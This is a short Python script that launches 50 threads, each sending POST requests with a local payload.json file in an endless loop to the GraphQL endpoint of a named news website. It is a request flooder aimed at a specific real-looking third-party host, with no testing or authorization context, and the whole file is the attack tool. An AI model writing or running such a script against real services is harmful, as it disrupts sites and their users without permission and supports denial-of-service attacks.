#!/usr/bin/env python3

import json
import requests
import threading

url = 'https://radar.somoynews.tv/graphql'

headers = {'Authorization' : '', 'Accept' : 'application/json', 'Content-Type' : 'application/json'}



def post_request():
    while True:
        rdata = requests.post(url, data=open('payload.json', 'rb'), headers=headers)
        print(rdata.text)

threads = [] 
for i in range(50): 
    t = threading.Thread(target=post_request) 
    t.daemon = True 
    threads.append(t) 

for i in range(50): 
    threads[i].start() 

for i in range(50):
    threads[i].join() 


